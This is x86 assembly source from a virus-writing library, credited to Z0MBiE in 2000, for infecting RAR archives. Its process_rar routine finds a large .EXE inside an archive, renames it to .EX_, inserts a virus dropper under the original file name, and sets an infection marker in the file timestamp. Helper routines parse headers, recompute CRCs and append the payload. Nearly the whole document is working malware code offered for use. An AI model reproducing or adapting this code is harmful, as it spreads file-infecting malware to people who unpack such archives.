; ---------------------------------------------------------------------------
; RAR archives management     1.00     (x) 2000 Z0MBiE, http://z0mbie.cjb.net
; ---------------------------------------------------------------------------

; process_rar(EDX=filename,            -- find .EXE file, rename it to .EX_,
;             ESI=dropper code,           and add virus dropper with name of
;             ECX=dropper size) : CF      the first file

; rar_open(EDX=filename) : CF          -- open archive
; rar_findnext() : CF, CF=1--eof       -- read next file header (into rar_fh)
; rar_update()                         -- write back current file data
; rar_add(EDX=file_code,               -- add new file to archive
;         ECX=file_size,
;         ESI=file_name / 0--default,
;         EBX=file_time / 0--default)
; rar_close()                          -- close archive

; ---------------------------------------------------------------------------

EXT_ZMB                 equ     '_xe.'

; RAR management library: uninitialized data

rar_data                struc

rar_handle              dd      ?       ; opened file(rar archive) handle
rar_thispos             dd      ?       ; offset of current header (rar_fh)
rar_nextpos             dd      ?       ; offset of next header

rar_buf_size            equ     4096
rar_buf                 label   byte

rar_id_size             equ     7
rar_id                  db      rar_id_size dup (?)

rar_mh_size             equ     13
rar_mh                  label   byte
rar_mh_headcrc          dw      ?
rar_mh_headtype         db      ?
rar_mh_flags            dw      ?
rar_mh_headsize         dw      ?
rar_mh_highposav        dw      ?
rar_mh_posav            dd      ?

rar_fh_size             equ     32
rar_fh                  label   byte
rar_fh_headcrc          dw      ?
rar_fh_headtype         db      ?
rar_fh_flags            dw      ?
rar_fh_headsize         dw      ?
rar_fh_packsize         dd      ?
rar_fh_unpsize          dd      ?
rar_fh_hostos           db      ?
rar_fh_filecrc          dd      ?
rar_fh_filetime         dd      ?
rar_fh_unpver           db      ?
rar_fh_method           db      ?
rar_fh_namesize         dw      ?
rar_fh_fileattr         dd      ?

rar_fname_size          equ     rar_buf_size-rar_id_size-rar_mh_size-rar_fh_size
rar_fname               db      rar_fname_size dup (?)

rar_data                ends

; ---------------------------------------------------------------------------

; subroutine:   process_rar
; input:        EDX=filename (.rar/.exe(sfx))
;               ESI=dropper code
;               ECX=dropper size
; output:       CF=0 -- file has been infected

process_rar:            pusha
                        sub     esp, size rar_data   ; all vars on the stack
                        mov     ebp, esp             ; ebp points to rar_data

                        call    rar_open                  ; open archive
                        jc      __exit

__cycle:                call    rar_findnext              ; get file header
                        jc      __exitcycle

                        movzx   eax, rar_fh_namesize[ebp] ; calculate:
                        lea     edi, rar_fname[ebp]       ; @curr file ext
                        lea     edi, [edi+eax-4]

                        mov     eax, [edi]               ; get file extension
                        or      eax, 20202000h
                        neg     eax

                        cmp     eax, -EXT_ZMB   ; alredy infected?
                        jne     __1
                        mov     ebx, rar_fh_filetime[ebp]
                        cmp     bl, bh
                        stc
                        je      __exitcycle
__1:

                        cmp     rar_fh_unpsize[ebp], 16384
                        jb      __cycle
                        cmp     eax, -'exe.'
                        jne     __cycle

                        mov     edx, esi ; EDX=code, ECX=size
                        xor     esi, esi ; file_name: 0=default
                        xor     ebx, ebx ; file_time: 0=default
                        call    rar_add  ; add new file (our body) to archive

                        push    rar_thispos[ebp]    ; reread current rar_fh
                        pop     rar_nextpos[ebp]
                        call    rar_findnext

                        mov     eax, not EXT_ZMB
                        not     eax
                        stosd

                        mov     al, rar_fh_filetime[ebp].byte ptr 1
                        mov     rar_fh_filetime[ebp].byte ptr 0, al

                        call    rar_update  ; rename current file in archive

                        clc

__exitcycle:            pushf                           ; close archive
                        call    rar_close
                        popf

__exit:                 lea     esp, [esp + size rar_data]  ; exit
                        popa
                        ret

; ---------------------------------------------------------------------------

; subroutine:   rar_open
; input:        EDX=filename
; output:       CF=0 -- file has been opened (use rar_close to close file)
;               CF=1 -- an error occured

rar_open:               pusha

                        call    fopen_rw                ; open archive
                        jc      __error
                        xchg    ebx, eax

                        xor     esi, esi                ; 'sfxsize'

__cycle1:               lea     edx, rar_buf[ebp]       ; read buffer
                        mov     ecx, rar_buf_size
                        call    fread
                        or      eax, eax
                        jz      __close

                        push    rar_id_size+rar_mh_size
                        pop     ecx

__cycle2:               cmp     eax, ecx
                        jle     __cont2

                        ; 'Rar!',1Ah,7,0
                        mov     edi, [edx+3]      ; find archive id
                        xor     edi, [edx]
                        neg     edi
                        cmp     edi, 0DE8A848Dh
                        je      __foundsign

__cont2:                inc     esi                     ; file offset
                        inc     edx                     ; buf-relative offset
                        dec     eax                     ; buf size
                        jmp     __cycle2

__foundsign:

                        movzx   eax, rar_mh_flags[ebp]
                        test    al, 1+32  ; 1=volume 32=av (both sucks)
                        jnz     __close

                        movzx   eax, rar_mh_headsize[ebp] ;calc & store first
                        lea     eax, [esi+rar_id_size+eax];file header offset
                        mov     rar_nextpos[ebp], eax

                        mov     rar_handle[ebp], ebx    ; store handle

                        clc

                        popa
                        ret

__close:                call    fclose

__error:                stc

                        popa
                        ret

; ---------------------------------------------------------------------------

; subroutine:   rar_findnext
; output:       CF=0 -- success
;               CF=1 -- eof or error

rar_findnext:           pusha

__cycle1:               mov     edx, rar_nextpos[ebp]
                        mov     rar_thispos[ebp], edx

                        mov     ebx, rar_handle[ebp]
                        call    fseek

                        lea     edx, rar_fh[ebp]
                        push    rar_fh_size
                        pop     ecx
                        call    fread
                        cmp     eax, ecx
                        jne     __error

                        movzx   eax, rar_fh_headsize[ebp]
                        add     rar_nextpos[ebp], eax

                        bt      rar_fh_flags[ebp], 15
                        jnc     __1
                        mov     eax, rar_fh_packsize[ebp]
                        add     rar_nextpos[ebp], eax
__1:
                        cmp     rar_fh_headtype[ebp], 74h
                        jne     __cycle1

                        movzx   ecx, rar_fh_namesize[ebp]
                        cmp     ecx, rar_fname_size
                        jae     __cycle1
                        lea     edx, rar_fname[ebp]
                        call    fread

                        mov     byte ptr [edx+eax], 0

                        clc

                        popa
                        ret

__error:                stc

                        popa
                        ret

; ---------------------------------------------------------------------------

; subroutine:   rar_update

rar_update:             pusha

                        call    rar_upd_fh_crc

                        mov     ebx, rar_handle[ebp]
                        mov     edx, rar_thispos[ebp]
                        call    fseek

                        call    rar_write_fh_name

                        popa
                        ret

; ---------------------------------------------------------------------------

; subroutine:   rar_add
; input:        EDX=file code
;               ECX=file size
;               ESI=file name (0=default, rar_fname)
;               EBX=file time (0=default, rar_fh_filetime)

rar_add:                pusha
                        cld

                        push    ecx
                        push    edx

                        lea     edi, rar_fh_headtype[ebp]

                        mov     al, 74h         ; headtype=74
                        stosb
                        mov     eax, 00008000h  ; headflags=8000, headsize=0
                        stosd
                        mov     eax, ecx
                        stosd                   ; packsize
                        stosd                   ; unpsize
                        xor     eax, eax        ; hostos
                        stosb
                        push    ebx             ; filetime
                        call    xcrc32
                        stosd                   ; filecrc

                        pop     eax             ; filetime

                        or      eax, eax        ; 0=use default
                        jnz     __1
                        mov     eax, [edi]
__1:
                        stosd
                        mov     ax, 3014h       ; unpver=14h method=30h
                        stosw

                        or      esi, esi        ; 0=default
                        jnz     __2
                        movzx   eax, word ptr [edi]
                        jmp     __3

__2:                    push    edi
                        lea     edi, rar_fname[ebp]  ; copy fname (ESI) &
                        xor     ecx, ecx        ; calc len (ECX)
__copy:                 inc     ecx
                        lodsb
                        stosb
                        or      al, al
                        jnz     __copy
                        dec     ecx
                        xchg    ecx, eax
                        pop     edi

__3:                    stosw                   ; namesize
                        add     eax, rar_fh_size
                        mov     rar_fh_headsize[ebp], ax  ; headsize

                        push    20h
                        pop     eax
                        stosd                   ; fileattr

                        call    rar_upd_fh_crc

                        mov     ebx, rar_handle[ebp]
                        call    fseekend

                        call    rar_write_fh_name

                        pop     edx
                        pop     ecx
                        call    fwrite

                        popa
                        ret

; ---------------------------------------------------------------------------

; subroutine:   rar_close

rar_close:              pusha

                        mov     ebx, rar_handle[ebp]
                        call    fclose

                        popa
                        ret

; ---------------------------------------------------------------------------

; update rar_fh_headcrc

rar_upd_fh_crc:         movzx   ecx, rar_fh_namesize[ebp]
                        add     ecx, rar_fh_size - 2
                        lea     edx, rar_fh[ebp] + 2
                        xor     eax, eax
                        call    xcrc32
                        mov     rar_fh_headcrc[ebp], ax
                        ret

; write rar_fh and fname

rar_write_fh_name:      movzx   ecx, rar_fh_namesize[ebp]
                        add     ecx, rar_fh_size
                        lea     edx, rar_fh[ebp]
                        call    fwrite
                        ret

; ---------------------------------------------------------------------------
